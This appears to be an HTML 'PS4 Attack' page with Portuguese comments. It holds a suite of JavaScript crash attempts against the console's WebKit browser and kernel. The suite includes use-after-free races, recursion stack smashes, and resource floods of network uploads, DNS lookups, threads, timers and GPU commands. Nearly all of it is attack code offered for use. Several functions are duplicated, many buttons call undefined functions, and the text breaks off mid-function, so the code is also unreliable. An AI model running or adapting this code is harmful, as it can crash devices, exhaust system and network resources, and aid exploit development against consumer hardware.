<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
   <title>PS4 Attack</title>
   </head>
<body>

  <h1>ATTACK SUITE</h1>

    
        
        <button onclick="runOffscreenRace()">TEST 1: OffscreenCanvas Transfer Race</button>
        <button onclick="runNodeIteratorUAF()">TEST 2: NodeIterator Filter Detach UAF</button>
        <button onclick="runXSLTCrash()">TEST 3: XSLT Infinite Recursion</button>  
        <button class="kernel" onclick="runPipeFlood()">TEST 4: IPC Pipe Memory Flood</button>
        <button class="kernel" onclick="runNetBufferFlood()">TEST 5: Socket Mbuf Exhaustion</button>
        <button class="kernel" onclick="runThreadStorm()">TEST 6: Thread Scheduler Panic</button>
        <button onclick="runAudioProcessorRace()">TEST 1: ScriptProcessorNode Audio UAF</button>
        <button onclick="runAnimationUAF()">TEST 2: CSS Animation Event UAF</button>
        <button onclick="runDOMCycle()">TEST 3: DOM Cyclic Insertion Crash</button>
        <button class="kernel" onclick="runBeaconRace()">TEST 4: sendBeacon Buffer Detach (Net UAF)</button>
        <button class="kernel" onclick="runNotificationRace()">TEST 5: Notification Icon Blob Race</button>
        <button class="kernel" onclick="runBlobSliceOverflow()">TEST 6: Blob Slice 64-bit Overflow</button>
        <button onclick="runRangeCrash()">TEST 1: Range Exception UAF (DOM Logic)</button>
        <button onclick="runCanvasInfinity()">TEST 2: Canvas Infinity Geometry Crash</button>
        <button class="kernel" onclick="runFSFlood()">TEST 4: Filesystem Cache Sync Stress</button>
        <button class="kernel" onclick="runDNSFlood()">TEST 5: DNS Resolver Memory Flood</button>
        <button onclick="runNodeIterUAF()">TEST 1: NodeIterator Removal UAF</button>
        <button onclick="runClassListCrash()">TEST 2: DOMTokenList Toggle Race</button>
        <button onclick="runProtoRecursion()">TEST 3: Proxy Prototype Stack Smash</button>
        <button class="kernel" onclick="runGPUFlood()">TEST 4: GPU Command Buffer Flood</button>
        <button class="kernel" onclick="runTimerCascade()">TEST 5: Kernel Timer Exhaustion</button>
        <button class="kernel" onclick="runStackClash()">TEST 6: Thread Stack Clash (Panic)</button>
        <button onclick="runNodeIterUAF()">TEST 1: NodeIterator Removal UAF</button>
        <button onclick="runClassListCrash()">TEST 2: DOMTokenList Toggle Race</button>
        <button onclick="runProtoRecursion()">TEST 3: Proxy Prototype Stack Smash</button>
        <button class="kernel" onclick="runGPUFlood()">TEST 4: GPU Command Buffer Flood</button>
        <button class="kernel" onclick="runTimerCascade()">TEST 5: Kernel Timer Exhaustion</button>
        <button class="kernel" onclick="runStackClash()">TEST 6: Thread Stack Clash (Panic)</button>
        <button onclick="runFullscreenUAF()">TEST 1: Fullscreen Element Detach UAF</button>
        <button onclick="runToggleStack()">TEST 2: Recursive Toggle Stack Smash</button>
        <button onclick="runBackdropCrash()">TEST 3: ::backdrop Style Confusion</button>
        <button class="kernel" onclick="runIframeFlood()">TEST 4: Iframe Window Handle Flood</button>
        <button class="kernel" onclick="runVideoPanic()">TEST 5: Video Surface Swap Panic</button>
        <button class="kernel" onclick="runCanvasGPU()">TEST 6: Canvas GPU Buffer Race</button>
        <button onclick="prepareFullscreen()">TEST 1: Fullscreen Alert Race (Requires Click)</button>
        <button onclick="runCaretCrash()">TEST 2: CaretRange Layout Thrashing</button>
        <button onclick="runCounterUAF()">TEST 3: CSS Counter Style UAF</button>
        <button class="kernel" onclick="runStorageThrash()">TEST 4: LocalStorage I/O Deadlock</button>
        <button class="kernel" onclick="runSocketHold()">TEST 5: Fetch Keep-Alive Exhaustion</button>
        <button class="kernel" onclick="runThreadSleep()">TEST 6: Worker Atomics Wait (Kernel Memory)</button>
        <button onclick="runSVGMarkerCrash()">TEST 1: SVG Marker Infinite Recursion</button>
        <button onclick="runCounterStyleCrash()">TEST 2: CSS @counter-style Cyclic Crash</button>
        <button onclick="runAbortUAF()">TEST 3: AbortSignal Listener UAF</button>
        <button class="kernel" onclick="runConsoleTraceFlood()">TEST 4: Console.trace Kernel Buffer Flood</button>
        <button class="kernel" onclick="runWorkerNameCollision()">TEST 5: SharedWorker Name Collision Storm</button>
        <button class="kernel" onclick="runFutexCrash()">TEST 6: Atomics.notify Futex Panic</button>
        <button onclick="runReverseTrap()">TEST 1: Array.reverse Prototype Trap</button>
        <button onclick="runRegexRecursion()">TEST 2: RegExp Recursive Execution</button>
        <button onclick="runWalkerUAF()">TEST 3: TreeWalker Removal UAF</button>
        <button class="kernel" onclick="runConsoleDeadlock()">TEST 4: Console Logging Deadlock</button>
        <button class="kernel" onclick="runBroadcastFlood()">TEST 5: BroadcastChannel Name Flood</button>
        <button class="kernel" onclick="runTransferChain()">TEST 6: Worker Transfer Stack Smash</button>
        <button onclick="runDataViewOOB()">TEST 1: DataView Offset Wrap-Around (OOB)</button>
        <button onclick="runApplySmash()">TEST 2: Function.apply Stack Smash</button>
        <button onclick="runRegexLookbehind()">TEST 3: RegExp Lookbehind Overflow</button>
        <button class="kernel" onclick="runLockExhaustion()">TEST 4: Kernel Semaphore/Lock Exhaustion</button>
        <button class="kernel" onclick="runMapExhaustion()">TEST 5: VM Map Entry Exhaustion (Panic)</button>
        <button class="kernel" onclick="runSocketDeadlock()">TEST 6: Socket Send Buffer Deadlock</button>
        <button onclick="runDataTransferUAF()">TEST 1: DataTransfer ItemList UAF</button>
        <button onclick="runFontLoadRace()">TEST 2: FontFace Loading Race</button>
        <button onclick="runHistoryDeepStack()">TEST 3: History Deep Stack Smash</button>
        <button class="kernel" onclick="runDNSOverflow()">TEST 4: getaddrinfo Stack Overflow</button>
        <button class="kernel" onclick="runCondVarRace()">TEST 5: Atomics.wait CondVar Panic</button>
        <button class="kernel" onclick="runMutexDoubleFree()">TEST 6: Console Mutex Double Unlock</button>
  
       
    

	
	
    <div id="log">Status: Aguardando testes...</div>
    <canvas id="c" width="100" height="100"></canvas>
    
    <div id="hidden-area" style="display:none;"></div>
    <div id="font-area" style="font-family: sans-serif;"></div>
    <canvas id="c_src" width="100" height="100" style="display:none;"></canvas>
    <canvas id="c_dst" width="100" height="100" style="display:none;"></canvas>
    <div id="sandbox" style="display:none;"></div>
    <div id="ax-root"></div>
    <div id="box" style="width:100px; height:100px; background:red; display:none;"></div>

    <script>
        function log(msg) { 
            const el = document.getElementById('log');
            el.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        }

        // --- TESTE 1: OffscreenCanvas Transfer Race ---
        function runOffscreenRace() {
            log("[WebKit] Iniciando Offscreen Race...");
            
            if (!window.OffscreenCanvas) {
                log("OffscreenCanvas não suportado.");
                return;
            }

            const canvas = document.createElement('canvas');
            canvas.width = 100; canvas.height = 100;
            const ctx = canvas.getContext('2d'); // Contexto inicial
            
            try {
                // O GOLPE: Transferir enquanto desenha
                const offscreen = canvas.transferControlToOffscreen();
                const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
                
                // Envia para worker (Neutering)
                w.postMessage(offscreen, [offscreen]);
                
                // Tenta usar o contexto original IMEDIATAMENTE
                // O C++ pode ainda ter uma referência ao buffer gráfico
                ctx.fillStyle = "red";
                ctx.fillRect(0,0,50,50);
                
                log("Canvas Race finalizada (Seguro).");
                w.terminate();
            } catch(e) {
                // "InvalidStateError" é a proteção. Crash é o objetivo.
                log("Resultado: " + e.message);
            }
        }

        // --- TESTE 2: NodeIterator Filter Detach UAF ---
        function runNodeIteratorUAF() {
            log("[WebKit] Iniciando NodeIterator UAF...");
            const root = document.createElement('div');
            root.innerHTML = "<div><span>A</span><b>B</b></div>";
            document.body.appendChild(root);
            
            const ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT, {
                acceptNode: function(node) {
                    if (node.tagName === "SPAN") {
                        log("Filtro ativo no SPAN. Removendo nó...");
                        // Remove o nó que está sendo avaliado
                        node.remove();
                        // Tenta corromper memória
                        const junk = new Array(1000).fill(1.1);
                        return NodeFilter.FILTER_ACCEPT;
                    }
                    return NodeFilter.FILTER_ACCEPT;
                }
            });

            try {
                // Itera. Quando chegar no SPAN, o filtro roda.
                let node;
                while(node = ni.nextNode()) {
                    // Loop
                }
                log("Iterator sobreviveu.");
            } catch(e) {
                log("Erro Iterator: " + e.message);
            }
            document.body.removeChild(root);
        }

        // --- TESTE 3: XSLT Infinite Recursion ---
        function runXSLTCrash() {
            log("[WebKit] Iniciando XSLT Stack Smash...");
            
            const xml = new DOMParser().parseFromString("<root/>", "text/xml");
            const xslt = new DOMParser().parseFromString(`
                <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
                    <xsl:template match="/">
                        <xsl:call-template name="bomb"/>
                    </xsl:template>
                    <xsl:template name="bomb">
                        <xsl:call-template name="bomb"/> <data>A</data>
                    </xsl:template>
                </xsl:stylesheet>
            `, "text/xml");

            try {
                const processor = new XSLTProcessor();
                processor.importStylesheet(xslt);
                // Transforma. O C++ entra em loop infinito na stack.
                processor.transformToFragment(xml, document);
                log("XSLT bloqueado (Stack Limit).");
            } catch(e) {
                log("Erro XSLT: " + e.message);
            }
        }

        // --- TESTE 4: IPC Pipe Memory Flood (Kernel) ---
        function runPipeFlood() {
            log("[KERNEL] Iniciando IPC Pipe Flood...");
            const channels = [];
            const data = new ArrayBuffer(1024 * 16); // 16KB
            
            const interval = setInterval(() => {
                // Cria 100 canais por ciclo e enche o buffer
                for(let i=0; i<100; i++) {
                    const mc = new MessageChannel();
                    mc.port1.postMessage(data); // Envia dados que nunca serão lidos
                    channels.push(mc); // Mantém vivo
                }
                
                if (channels.length % 2000 === 0) log(`Canais ativos: ${channels.length}`);
                
                if (channels.length > 40000) {
                    clearInterval(interval);
                    log("Limite IPC atingido. Verifique lentidão.");
                }
            }, 10);
        }

        // --- TESTE 5: Socket Mbuf Exhaustion (Kernel) ---
        function runNetBufferFlood() {
            log("[KERNEL] Iniciando Mbuf Flood (Network)...");
            
            const payload = new Uint8Array(10 * 1024 * 1024).fill(0x41); // 10MB
            const blob = new Blob([payload]);
            
            // Dispara 50 uploads simultâneos para lugar nenhum
            for(let i=0; i<50; i++) {
                // Porta aleatória para evitar bloqueio de socket único
                fetch("http://127.0.0.1:" + (8000+i), {
                    method: "POST",
                    body: blob,
                    mode: "no-cors"
                }).catch(e => {}); // Ignora erros, o objetivo é encher o buffer de saída
            }
            log("50 Uploads de 10MB iniciados. Stress na rede.");
        }

        // --- TESTE 6: Thread Scheduler Panic (Kernel) ---
        function runThreadStorm() {
            log("[KERNEL] Iniciando Thread Storm...");
            
            const url = URL.createObjectURL(new Blob(["self.close()"], {type:"text/javascript"}));
            let count = 0;
            
            const interval = setInterval(() => {
                // Cria e destrói 20 threads por ciclo (2000/seg)
                for(let i=0; i<20; i++) {
                    new Worker(url);
                    count++;
                }
                
                if (count % 1000 === 0) log(`Threads criadas: ${count}`);
                
                if (count > 20000) {
                    clearInterval(interval);
                    log("Thread Storm finalizada.");
                }
            }, 10);
        }

function runAudioProcessorRace() {
            log("[WebKit] Iniciando Audio Processor Race...");
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                // Nó de processamento legado (roda na main thread, sync com audio thread)
                let proc = ctx.createScriptProcessor(4096, 1, 1);
                
                proc.onaudioprocess = function(e) {
                    // O GOLPE:
                    // O evento disparou. A thread de áudio está à espera de dados.
                    // Nós desconectamos e anulamos o nó AGORA.
                    log("Audio Process! Destruindo...");
                    proc.disconnect();
                    proc.onaudioprocess = null;
                    proc = null;
                    
                    // Força GC massivo para limpar a memória do nó
                    const junk = [];
                    for(let i=0; i<5000; i++) junk.push(new ArrayBuffer(10000));
                };
                
                proc.connect(ctx.destination);
                log("Audio iniciado. Aguardando evento...");
                
            } catch(e) { log("Erro Audio: " + e.message); }
        }

        // --- TESTE 2: CSS Animation Event UAF ---
        // Remove elemento durante evento de animação.
        function runAnimationUAF() {
            log("[WebKit] Iniciando Animation UAF...");
            const box = document.createElement('div');
            box.className = "anim-box";
            document.getElementById('sandbox').appendChild(box);
            
            box.addEventListener('animationstart', () => {
                log("Animation Start! Removendo elemento...");
                // Remove do DOM
                box.remove();
                
                // Aloca lixo para ocupar o lugar do RenderObject
                const trash = new Array(1000).fill(1.1);
                
                // Força recalculo de estilo global
                // O motor pode tentar acessar o elemento removido para continuar a animação
                document.body.offsetHeight;
            });

            // Inicia animação
            box.style.animation = "spin 1s infinite";
        }

        // --- TESTE 3: DOM Cyclic Insertion Crash ---
        // Tenta enganar a validação de ciclos do DOM.
        function runDOMCycle() {
            log("[WebKit] Tentando Ciclo DOM...");
            const divA = document.createElement('div');
            const divB = document.createElement('div');
            
            divA.appendChild(divB);
            
            // Prepara listener que roda durante inserção
            divB.addEventListener('DOMNodeInserted', () => {
                log("Inserção detectada! Movendo A para dentro de B...");
                try {
                    // Tenta mover o pai (A) para dentro do filho (B)
                    // Isso deve ser bloqueado, mas com eventos de mutação, a validação pode falhar
                    divB.appendChild(divA); 
                } catch(e) {
                    // Se capturar, tenta via range ou fragment
                }
            });

            try {
                log("Inserindo B...");
                // Trigger inicial
                document.getElementById('sandbox').appendChild(divA);
                divA.removeChild(divB);
                divA.appendChild(divB); // Re-insere para disparar evento
                
                log("DOM Cycle check (Seguro).");
            } catch(e) { log("Erro DOM: " + e.message); }
        }

        // --- TESTE 4: sendBeacon Buffer Detach (Kernel) ---
        // Envia dados para rede e invalida a memória.
        function runBeaconRace() {
            log("[KERNEL] Iniciando Beacon Detach...");
            
            // Cria buffer grande (1MB)
            const buffer = new Uint8Array(1024 * 1024);
            buffer.fill(0x41);
            
            // Worker para neutrar o buffer
            const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/javascript"})));
            
            try {
                // Envia Beacon (Assíncrono)
                // O navegador prepara os dados para passar ao Kernel
                navigator.sendBeacon("http://127.0.0.1:9999/crash", buffer);
                
                // O GOLPE: Transfere o buffer imediatamente!
                // Se a cópia para o Kernel ainda não acabou, vai ler lixo ou crashar.
                w.postMessage(buffer.buffer, [buffer.buffer]);
                
                if (buffer.byteLength === 0) {
                    log("Buffer neutralizado com sucesso! Verifique estabilidade.");
                }
            } catch(e) { log("Erro Beacon: " + e.message); }
            
            w.terminate();
        }

        // --- TESTE 5: Notification Icon Blob Race (Kernel) ---
        // Usa o sistema de notificação do SO.
        function runNotificationRace() {
            log("[KERNEL] Iniciando Notification Blob Race...");
            
            if (!("Notification" in window)) return log("API não suportada.");
            
            Notification.requestPermission().then(perm => {
                if (perm !== "granted") return log("Permissão negada.");
                
                const blob = new Blob(["IMAGE DATA"], {type: "image/png"});
                const url = URL.createObjectURL(blob);
                
                // Mostra notificação
                const n = new Notification("System Crash Test", { icon: url });
                
                // O GOLPE: Revoga a URL imediatamente
                // O processo VSH (System UI) vai tentar carregar a imagem agora
                URL.revokeObjectURL(url);
                
                log("Notificação enviada e URL revogada.");
            });
        }

        // --- TESTE 6: Blob Slice 64-bit Overflow (Kernel) ---
        // Ataca o driver de ficheiros.
        function runBlobSliceOverflow() {
            log("[KERNEL] Testando Blob Slice Overflow...");
            
            try {
                const blob = new Blob(["BASE"]);
                
                // Valores que podem causar overflow em aritmética de ponteiro
                // Start > End, ou Start + Length > Max
                const slices = [
                    { s: 0, e: -1 }, // Underflow
                    { s: 100, e: 10 }, // Lógica invertida
                    { s: 9007199254740991, e: 9007199254740992 } // Max Safe Integer
                ];
                
                slices.forEach(cfg => {
                    const s = blob.slice(cfg.s, cfg.e);
                    // Tenta ler para forçar o Kernel a mapear a memória
                    const r = new FileReader();
                    r.readAsText(s);
                });
                
                log("Slices criados (Seguro).");
                
            } catch(e) { log("Erro Blob: " + e.message); }
        }
 function runRangeCrash() {
            log("[WebKit] Iniciando Range Exception UAF...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "<div><b>A</b><i>B</i></div>";
            const target = sandbox.firstChild;
            
            const range = document.createRange();
            range.selectNodeContents(target);
            
            // Observador para injetar a exceção
            target.addEventListener('DOMNodeRemoved', () => {
                log("Nó removido. Lançando exceção crítica...");
                // O C++ não espera que o JS lance erro aqui
                // Isso pode deixar o estado do Range corrompido
                throw "BOOM"; 
            });

            try {
                log("Executando deleteContents...");
                range.deleteContents();
            } catch(e) {
                log("Exceção capturada. Verificando estabilidade...");
                
                // Tenta usar o range que pode estar num estado inválido
                try {
                    range.insertNode(document.createTextNode("TEST"));
                    log("Range sobreviveu.");
                } catch(x) { log("Erro pós-crash: " + x); }
            }
            sandbox.innerHTML = "";
        }

        // --- TESTE 2: Canvas Infinity Geometry Crash ---
        // Passa coordenadas infinitas para o motor gráfico.
        function runCanvasInfinity() {
            log("[WebKit] Desenhando Geometria Infinita...");
            const ctx = document.getElementById('c').getContext('2d');
            
            try {
                ctx.beginPath();
                ctx.moveTo(0, 0);
                
                // Coordenadas tóxicas
                const inf = Infinity;
                const nan = NaN;
                
                // Tenta confundir o cálculo de Bounding Box
                log("Traçando linhas para o Infinito...");
                ctx.lineTo(inf, inf);
                ctx.lineTo(-inf, 100);
                ctx.arc(100, 100, inf, 0, Math.PI);
                ctx.rect(nan, nan, 100, 100);
                
                // O GOLPE: Rasterizar (Fill/Stroke)
                // O motor tenta alocar memória para cobrir a área "infinita"?
                ctx.fill();
                ctx.stroke();
                
                // Tenta getImageData para forçar leitura da memória gráfica
                // Se o estado interno corrompeu, isso deve crashar
                ctx.getImageData(0, 0, 1, 1);
                
                log("Rasterizador sobreviveu.");
                
            } catch(e) {
                log("Erro Canvas: " + e.message);
            }
        }

        // --- TESTE 3: Worker Cyclic Clone Stack Smash ---
        // Cria ciclo dinâmico para estourar a stack do serializador.
        function runCloneSmash() {
            log("[WebKit] Iniciando Clone Stack Smash...");
            
            try {
                const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
                
                const target = {};
                // Proxy que cria o ciclo apenas quando lido
                const proxy = new Proxy(target, {
                    get: (t, p) => {
                        if (p === "cycle") return proxy; // Retorna a si mesmo
                        return Reflect.get(t, p);
                    }
                });
                
                // Adiciona profundidade para forçar recursão antes do ciclo
                let root = proxy;
                for(let i=0; i<1000; i++) {
                    root = { next: root };
                }

                log("Enviando objeto cíclico dinâmico...");
                // postMessage usa StructuredClone. 
                // O detetor de ciclos pode falhar com Proxies dinâmicos.
                w.postMessage(root);
                
                log("Envio concluído (Stack segura).");
                w.terminate();
                
            } catch(e) {
                log("Erro Clone: " + e.message);
            }
        }

        // --- TESTE 4: Filesystem Cache Sync Stress (Kernel) ---
        // Usa Cache API para forçar I/O de disco massivo.
        function runFSFlood() {
            log("[KERNEL] Iniciando Filesystem Stress...");
            
            if (!window.caches) return log("Cache API não suportada.");
            
            const data = new Response(new ArrayBuffer(1024 * 128)); // 128KB
            let count = 0;
            
            caches.open('fs-stress').then(cache => {
                const interval = setInterval(() => {
                    // Grava 50 arquivos por ciclo
                    for(let i=0; i<50; i++) {
                        // Nomes únicos forçam novas inodes no disco
                        cache.put('/file' + count + Math.random(), data.clone())
                            .catch(e => {}); 
                        count++;
                    }
                    
                    if (count % 500 === 0) log(`Arquivos gravados: ${count}`);
                    
                    if (count > 10000) {
                        clearInterval(interval);
                        // Tenta limpar para não encher o HD permanentemente
                        caches.delete('fs-stress');
                        log("Stress de disco finalizado.");
                    }
                }, 10);
            });
        }

        // --- TESTE 5: DNS Resolver Memory Flood (Kernel) ---
        // Força resolução de nomes massiva.
        function runDNSFlood() {
            log("[KERNEL] Iniciando DNS Resolver Flood...");
            
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<50; i++) {
                    // Domínios aleatórios forçam o Kernel a consultar DNS (não cacheado)
                    // Isso consome sockets UDP e memória de rede (mbuf)
                    const domain = "http://" + Math.random().toString(36).substring(7) + ".com";
                    
                    fetch(domain, { mode: 'no-cors' }).catch(() => {});
                    count++;
                }
                
                if (count % 500 === 0) log(`Resoluções DNS: ${count}`);
                
                if (count > 5000) {
                    clearInterval(interval);
                    log("DNS Flood finalizado. Teste a conexão.");
                }
            }, 20);
        }
function runNodeIterUAF() {
            log("[WebKit] Iniciando NodeIterator UAF...");
            const root = document.createElement('div');
            root.innerHTML = "<span>A</span><span>B</span><span>C</span>";
            document.body.appendChild(root);
            
            const ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT);
            
            try {
                // Avança um pouco
                ni.nextNode(); // root
                const target = ni.nextNode(); // span A
                
                log("Iterator em posição. Removendo nó...");
                
                // O GOLPE: Remove o nó onde o iterador está
                // O WebKit tenta "consertar" o iterador movendo-o para o próximo nó válido.
                // Se manipularmos o DOM durante esse "conserto" (via mutation events), crash.
                root.removeChild(target);
                
                // Tenta acessar imediatamente
                const next = ni.nextNode();
                log("Iterator recuperou para: " + next);
                
            } catch(e) {
                log("Erro Iterator: " + e.message);
            }
            document.body.removeChild(root);
        }

        // --- TESTE 2: DOMTokenList Toggle Race ---
        function runClassListCrash() {
            log("[WebKit] Iniciando ClassList Race...");
            const el = document.createElement('div');
            
            // Define um getter 'className' no elemento (se possível) ou usa Proxy em atributos
            // Como não podemos sobrescrever className nativo facilmente, usamos toggle em loop apertado
            
            try {
                const interval = setInterval(() => {
                    // Toggle força leitura, parse e reescrita da string de classe
                    // Se fizermos isso milhares de vezes, tentamos corromper o cache de strings
                    for(let i=0; i<1000; i++) {
                        el.classList.toggle("class-" + i);
                    }
                }, 0);
                
                setTimeout(() => {
                    clearInterval(interval);
                    log("ClassList Test finalizado.");
                }, 2000);
                
            } catch(e) {
                log("Erro ClassList: " + e.message);
            }
        }

        // --- TESTE 3: Proxy Prototype Stack Smash ---
        function runProtoRecursion() {
            log("[WebKit] Iniciando Prototype Recursion...");
            
            try {
                const target = {};
                const proxy = new Proxy(target, {
                    get: (t, p, r) => {
                        // Retorna o próprio proxy como protótipo?
                        return Reflect.get(t, p, r);
                    },
                    getPrototypeOf: () => {
                        // Recursão infinita no lookup de protótipo
                        return proxy; 
                    }
                });
                
                // O GOLPE: Tenta ler propriedade inexistente.
                // O motor sobe a cadeia de protótipos. Se a cadeia for o próprio objeto...
                // Stack Overflow na thread principal.
                log("Acessando propriedade em ciclo de protótipo...");
                const val = proxy.foo;
                
                log("Lookup finalizado (Seguro).");
                
            } catch(e) {
                log("Erro Proto: " + e.message);
            }
        }

        // --- TESTE 4: GPU Command Buffer Flood (Kernel) ---
        function runGPUFlood() {
            log("[KERNEL] Iniciando GPU Flood...");
            const c = document.getElementById('c');
            const ctx = c.getContext('2d');
            
            // Cria caminho complexo
            ctx.beginPath();
            
            // Adiciona 1 milhão de comandos de linha
            // O Kernel gráfico tem de armazenar isto antes de rasterizar
            log("Gerando 1M comandos gráficos...");
            
            try {
                for(let i=0; i<1000000; i++) {
                    ctx.lineTo(Math.random() * 1000, Math.random() * 1000);
                    
                    // A cada 10k, tenta forçar envio parcial sem limpar
                    if (i % 10000 === 0) ctx.moveTo(0,0);
                }
                
                log("Comandos gerados. Enviando para GPU (Stroke)...");
                ctx.stroke(); // O crash acontece aqui ou logo após
                log("GPU sobreviveu.");
                
            } catch(e) {
                log("Erro GPU: " + e.message);
            }
        }

        // --- TESTE 5: Kernel Timer Exhaustion (Kernel) ---
        function runTimerCascade() {
            log("[KERNEL] Iniciando Timer Cascade...");
            let count = 0;
            
            function spawn(depth) {
                if (depth > 15) return; // 2^15 = 32k timers
                
                // Cria 2 timers para cada 1 existente (Exponencial)
                setTimeout(() => spawn(depth + 1), 10);
                setTimeout(() => spawn(depth + 1), 10);
                
                count++;
            }
            
            spawn(0);
            
            setInterval(() => {
                log(`Timers aproximados: ${count}`);
                if (count > 100000) log("ALERTA: Sobrecarga de Timers do Kernel.");
            }, 1000);
        }

        // --- TESTE 6: Thread Stack Clash (Kernel) ---
        function runStackClash() {
            log("[KERNEL] Iniciando Thread Stack Clash...");
            
            // Worker que aloca muita stack
            const code = `
                function smash(d) {
                    const v = new Uint32Array(1024); // 4KB na stack
                    if (d > 0) smash(d-1);
                    else postMessage("Deep");
                }
                onmessage = () => smash(2000); // ~8MB Stack
            `;
            const blob = new Blob([code], {type:"text/javascript"});
            const url = URL.createObjectURL(blob);
            
            // Lança workers em massa para colidir stacks adjacentes no Kernel
            for(let i=0; i<30; i++) {
                new Worker(url).postMessage("go");
            }
            log("Workers lançados. Aguardando Panic...");
        }
// --- TESTE 1: NodeIterator Removal UAF ---
        function runNodeIterUAF() {
            log("[WebKit] Iniciando NodeIterator UAF...");
            const root = document.createElement('div');
            root.innerHTML = "<span>A</span><span>B</span><span>C</span>";
            document.body.appendChild(root);
            
            const ni = document.createNodeIterator(root, NodeFilter.SHOW_ELEMENT);
            
            try {
                // Avança um pouco
                ni.nextNode(); // root
                const target = ni.nextNode(); // span A
                
                log("Iterator em posição. Removendo nó...");
                
                // O GOLPE: Remove o nó onde o iterador está
                // O WebKit tenta "consertar" o iterador movendo-o para o próximo nó válido.
                // Se manipularmos o DOM durante esse "conserto" (via mutation events), crash.
                root.removeChild(target);
                
                // Tenta acessar imediatamente
                const next = ni.nextNode();
                log("Iterator recuperou para: " + next);
                
            } catch(e) {
                log("Erro Iterator: " + e.message);
            }
            document.body.removeChild(root);
        }

        // --- TESTE 2: DOMTokenList Toggle Race ---
        function runClassListCrash() {
            log("[WebKit] Iniciando ClassList Race...");
            const el = document.createElement('div');
            
            // Define um getter 'className' no elemento (se possível) ou usa Proxy em atributos
            // Como não podemos sobrescrever className nativo facilmente, usamos toggle em loop apertado
            
            try {
                const interval = setInterval(() => {
                    // Toggle força leitura, parse e reescrita da string de classe
                    // Se fizermos isso milhares de vezes, tentamos corromper o cache de strings
                    for(let i=0; i<1000; i++) {
                        el.classList.toggle("class-" + i);
                    }
                }, 0);
                
                setTimeout(() => {
                    clearInterval(interval);
                    log("ClassList Test finalizado.");
                }, 2000);
                
            } catch(e) {
                log("Erro ClassList: " + e.message);
            }
        }

        // --- TESTE 3: Proxy Prototype Stack Smash ---
        function runProtoRecursion() {
            log("[WebKit] Iniciando Prototype Recursion...");
            
            try {
                const target = {};
                const proxy = new Proxy(target, {
                    get: (t, p, r) => {
                        // Retorna o próprio proxy como protótipo?
                        return Reflect.get(t, p, r);
                    },
                    getPrototypeOf: () => {
                        // Recursão infinita no lookup de protótipo
                        return proxy; 
                    }
                });
                
                // O GOLPE: Tenta ler propriedade inexistente.
                // O motor sobe a cadeia de protótipos. Se a cadeia for o próprio objeto...
                // Stack Overflow na thread principal.
                log("Acessando propriedade em ciclo de protótipo...");
                const val = proxy.foo;
                
                log("Lookup finalizado (Seguro).");
                
            } catch(e) {
                log("Erro Proto: " + e.message);
            }
        }

        // --- TESTE 4: GPU Command Buffer Flood (Kernel) ---
        function runGPUFlood() {
            log("[KERNEL] Iniciando GPU Flood...");
            const c = document.getElementById('c');
            const ctx = c.getContext('2d');
            
            // Cria caminho complexo
            ctx.beginPath();
            
            // Adiciona 1 milhão de comandos de linha
            // O Kernel gráfico tem de armazenar isto antes de rasterizar
            log("Gerando 1M comandos gráficos...");
            
            try {
                for(let i=0; i<1000000; i++) {
                    ctx.lineTo(Math.random() * 1000, Math.random() * 1000);
                    
                    // A cada 10k, tenta forçar envio parcial sem limpar
                    if (i % 10000 === 0) ctx.moveTo(0,0);
                }
                
                log("Comandos gerados. Enviando para GPU (Stroke)...");
                ctx.stroke(); // O crash acontece aqui ou logo após
                log("GPU sobreviveu.");
                
            } catch(e) {
                log("Erro GPU: " + e.message);
            }
        }

        // --- TESTE 5: Kernel Timer Exhaustion (Kernel) ---
        function runTimerCascade() {
            log("[KERNEL] Iniciando Timer Cascade...");
            let count = 0;
            
            function spawn(depth) {
                if (depth > 15) return; // 2^15 = 32k timers
                
                // Cria 2 timers para cada 1 existente (Exponencial)
                setTimeout(() => spawn(depth + 1), 10);
                setTimeout(() => spawn(depth + 1), 10);
                
                count++;
            }
            
            spawn(0);
            
            setInterval(() => {
                log(`Timers aproximados: ${count}`);
                if (count > 100000) log("ALERTA: Sobrecarga de Timers do Kernel.");
            }, 1000);
        }

        // --- TESTE 6: Thread Stack Clash (Kernel) ---
        function runStackClash() {
            log("[KERNEL] Iniciando Thread Stack Clash...");
            
            // Worker que aloca muita stack
            const code = `
                function smash(d) {
                    const v = new Uint32Array(1024); // 4KB na stack
                    if (d > 0) smash(d-1);
                    else postMessage("Deep");
                }
                onmessage = () => smash(2000); // ~8MB Stack
            `;
            const blob = new Blob([code], {type:"text/javascript"});
            const url = URL.createObjectURL(blob);
            
            // Lança workers em massa para colidir stacks adjacentes no Kernel
            for(let i=0; i<30; i++) {
                new Worker(url).postMessage("go");
            }
            log("Workers lançados. Aguardando Panic...");
        }
// --- TESTE 1: Fullscreen Element Detach UAF ---
        function runFullscreenUAF() {
            log("[WebKit] Iniciando Fullscreen Detach UAF...");
            const div = document.createElement('div');
            div.style.background = "blue";
            document.body.appendChild(div);

            // Solicita fullscreen (requer gesto do usuário, o clique no botão conta)
            div.requestFullscreen().then(() => {
                log("Entrou em Fullscreen.");
            }).catch(e => log("Erro: " + e));

            // O GOLPE: Remove o elemento IMEDIATAMENTE após o pedido.
            // A transição é assíncrona. O WebKit vai tentar promover um nó morto?
            setTimeout(() => {
                log("Removendo elemento durante transição...");
                document.body.removeChild(div);
                
                // Tenta alocar lixo para ocupar o lugar
                const trash = new Array(10000).fill(1.1);
                
                // Força saída para ver se crasha ao restaurar estado
                if (document.fullscreenElement) document.exitFullscreen();
            }, 10);
        }

        // --- TESTE 2: Recursive Toggle Stack Smash ---
        function runToggleStack() {
            log("[WebKit] Iniciando Toggle Stack Smash...");
            const div = document.createElement('div');
            document.body.appendChild(div);

            let count = 0;
            
            // Listener que cria o loop infinito
            document.onfullscreenchange = () => {
                count++;
                if (count > 500) {
                    document.onfullscreenchange = null;
                    log("Loop finalizado (Seguro).");
                    return;
                }

                try {
                    if (document.fullscreenElement) {
                        document.exitFullscreen();
                    } else {
